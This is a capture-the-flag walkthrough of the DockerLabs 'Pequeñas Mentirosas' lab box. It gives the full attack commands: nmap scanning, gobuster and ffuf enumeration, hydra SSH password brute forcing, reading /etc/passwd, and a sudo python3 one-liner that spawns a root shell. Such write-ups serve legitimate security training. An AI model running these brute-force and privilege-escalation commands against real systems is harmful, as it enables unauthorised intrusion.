# Pequeñas Mentirosas - Writeup

## 📋 Información General

- **Plataforma**: DockerLabs
- **Difficulty**: Easy
- **Category**: Brute Force
- **Date**: 16/02/2026
- **Time spent**: 10 minutes
- **Author**: Samuel Rodriguez aka Testarious

## 🔍 Recognition and Enumeration

### Port Scanning
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p22,80 172.17.0.2
```

**Results:**
- Open ports: 22,80
- Services: ssh, http


As we saw in the port scan, port 80 is open, so we access the web (http://172.17.0.2). We find a web page with a simple text that says: "Hint: Find the key for A in the files."

We continue with some web reconnaissance looking for directories, files and subdomains by launching scans with gobuster and ffuf.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 172.17.0.2 -H "Host: FUZZ.172.17.0.2" 
```

**Results:**
- Directories found: None
- Subdomains found: None

## 💻 Exploitation

As we see with the previous scans, there doesn't seem to be anything on the web server, so thinking about the hint given by the web, we proceed to try a brute force attack via SSH for user A.

### Attack Vector 1: Brute Force
```bash
hydra ssh://172.17.0.2:22 -l a -P /usr/share/wordlists/seclists/Passwords/stupid-ones-in-production.txt -t 50 
```

**Description:**
We try a brute force attack via SSH for user A with a small password list first.

**Results:**
We get the password for user A.

```bash
[22][ssh] host: 172.17.0.2   login: a   password: secret
```

The password for user A is "secret". So we proceed to connect via SSH.

```bash
ssh a@172.17.0.2
```

## 🔐 Privilege Escalation

Once logged in as user A, we proceed to enumerate the system.

### Local Enumeration
```bash
cat /etc/passwd
```

**Results:** Users found: spencer

```bash
spencer:x:1000:1000::/home/spencer:/bin/bash
```

We proceed to try a brute force attack via SSH for user Spencer.

```bash
hydra ssh://172.17.0.2:22 -l spencer -P /usr/share/wordlists/rockyou.txt -t 50
```

**Results**

```bash
[22][ssh] host: 172.17.0.2   login: spencer   password: password1
```

**Description:**
We get the password for user Spencer "password1". We access via SSH.

```bash
ssh spencer@172.17.0.2
```

Once logged in as user Spencer, we proceed to check the user's permissions. We discover that user Spencer has permission to execute the command /usr/bin/python3 as root without password.

```bash
sudo -l

User spencer may run the following commands on 5676aabcc292:
    (ALL) NOPASSWD: /usr/bin/python3
```

We proceed to create a script that allows us to get a shell as root.

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

And finally we are root on the victim machine!

## 🛠️ Tools Used

| Tool | Version | Specific Use |
|-------------|---------|----------------|
| nmap | 7.98 | Port and service scanning |
| hydra | 9.6 | Brute force |
| gobuster | 3.8.2 | Web enumeration |
| ffuf | 2.1 | Web enumeration |
| python3 | 3.10 | Privilege escalation |

## 🏆 Conclusión

This CTF seems quite introductory to get familiar with the use of brute force tools to obtain passwords. However, I see it as a good starting point to lose the fear of solving the first CTFs and gain confidence. Let's keep going! 🚀